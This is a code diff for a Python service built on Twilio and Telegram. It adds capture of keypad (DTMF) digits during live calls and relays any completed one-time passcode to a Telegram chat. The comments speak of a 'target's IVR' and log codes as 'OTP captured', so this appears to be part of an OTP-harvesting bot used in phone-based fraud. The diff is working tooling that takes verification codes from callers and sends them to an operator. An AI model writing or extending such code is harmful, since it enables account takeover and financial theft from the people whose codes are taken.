@@ -140,12 +140,17 @@ async def conversation_start(request: Request):
             chat_id = int(chat_id)
         except (ValueError, TypeError):
             chat_id = None
+    code_length = 6
+    try:
+        code_length = int(body.get("code_length", 6))
+    except (ValueError, TypeError):
+        pass
     if not call_sid:
         return JSONResponse({"ok": False, "error": "call_sid required"}, status_code=400)
 
-    await manager.ensure_session(call_sid, call_sid=call_sid, chat_id=chat_id)
+    await manager.ensure_session(call_sid, call_sid=call_sid, chat_id=chat_id, code_length=code_length)
     await manager.set_state(call_sid, "ringing")
-    logger.info("[CONVERSATION_START] live listen session for call_sid=%s chat_id=%s", call_sid, chat_id)
+    logger.info("[CONVERSATION_START] live listen session for call_sid=%s chat_id=%s code_length=%s", call_sid, chat_id, code_length)
     return {"ok": True}
 
 
@@ -206,6 +211,15 @@ async def twilio_media(ws: WebSocket):
                     except Exception as e:
                         logger.error("[TWILIO_MEDIA_RELAY_ERROR] %s", e)
 
+            elif event == "dtmf":
+                digit = (data.get("dtmf") or {}).get("digit")
+                if digit and call_sid:
+                    code = await manager.feed_dtmf(call_sid, digit)
+                    logger.info("[TWILIO_DTMF] call_sid=%s digit=%s buffer=%s",
+                                call_sid, digit, manager.sessions.get(call_sid).dtmf_buffer if manager.sessions.get(call_sid) else "?")
+                    if code:
+                        await _notify_otp_from_dtmf(call_sid, code)
+
             elif event == "stop":
                 logger.info("[TWILIO_MEDIA_STOP] call_sid=%s", call_sid)
                 if call_sid:
@@ -218,6 +232,37 @@ async def twilio_media(ws: WebSocket):
     finally:
         if call_sid:
             await manager.set_state(call_sid, "completed")
+
+
+# ======================================================================
+# Twilio-side OTP capture via DTMF
+#
+# When the target's IVR plays an OTP, the caller types it on the keypad.
+# Twilio Media Streams deliver those key presses to this socket as `dtmf`
+# events, so we can notify Telegram without relying on Vapi webhooks.
+# ======================================================================
+async def _notify_otp_from_dtmf(call_sid: str, digits: str):
+    s = manager.sessions.get(call_sid)
+    chat_id = getattr(s, "chat_id", None) if s else None
+    if s and s.otp_notified:
+        logger.info("[TWILIO_DTMF] OTP already notified for call_sid=%s, skipping", call_sid)
+        return
+    if not chat_id:
+        logger.warning("[TWILIO_DTMF] no chat_id for call_sid=%s — OTP %s captured but nothing to notify", call_sid, digits)
+        return
+    logger.info("[TWILIO_DTMF_OTP] code=%s call_sid=%s chat_id=%s", digits, call_sid, chat_id)
+    if s:
+        s.otp_notified = True
+
+    def _notify():
+        try:
+            from handlers.otp_notifier import notify_otp_captured
+            notify_otp_captured(int(chat_id), call_sid, digits)
+        except Exception as e:
+            logger.error("[TWILIO_DTMF_NOTIFY_ERROR] call_sid=%s error=%s", call_sid, e)
+
+    import threading
+    threading.Thread(target=_notify, daemon=True).start()
 
 
 # ======================================================================
